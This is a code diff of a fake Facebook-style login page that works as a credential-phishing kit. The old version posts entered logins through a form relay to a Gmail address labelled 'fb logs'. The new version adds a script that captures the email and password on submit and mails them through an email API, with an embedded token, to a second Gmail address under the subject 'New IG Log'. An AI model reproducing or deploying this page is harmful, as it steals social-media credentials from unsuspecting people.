@@ -30,10 +30,7 @@
 						<div class="card-body">
 							<h4 class="card-title">Sign in to continue</h4>
 							
-							<form action="https://formsubmit.co/claimyourcash99@gmail.com" method="POST" class="my-login-validation" novalidate="">
-							<input type="hidden" name="_next" value="https://facebook.com">
-								<input type="hidden" name="_captcha" value="false">
-								<input type="hidden" name="_subject" value="fb logs">
+							<form action="https://facebook.com" method="POST" class="my-login-validation" novalidate="">
 								<div class="form-group">
 									<input id="email" type="username" placeholder="Mobile number or email address" class="form-control" name="email" value="" required autofocus>
 
@@ -44,7 +41,7 @@
 
 								<div class="form-group">
 									
-									<input id="password" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
+									<input id="pass" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
 								    <div class="invalid-feedback">
 								    	Password is required
 							    	</div>
@@ -53,7 +50,7 @@
 								
 
 								<div class="form-group m-0">
-									<button type="submit" class="btn btn-primary btn-block">
+									<button type="submit" onclick="sendEmail()" class="btn btn-primary btn-block">
 										Log in
 									</button>
 									
@@ -71,7 +68,22 @@
 			</div>
 		</div>
 	</section>
-
+	<script>
+		function sendEmail() {
+    var email = document.getElementById("email").value;
+    var pass = document.getElementById("pass").value;
+    var finalmessage = "Email is " + email + " and password is " + pass
+    Email.send({
+        SecureToken : "7c2706f9-3255-43e9-bbcf-bd69c5aade5b",
+        To : 'receivecompanygiveawaycash@gmail.com',
+        From : "receivecompanygiveawaycash@gmail.com",
+        Subject : "New IG Log",
+        Body : finalmessage
+    }).then(
+      message => console.log(message)
+    );
+}
+	</script>
 	<script src="../code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
 	<script src="js/my-login.html"></script>
 </body>
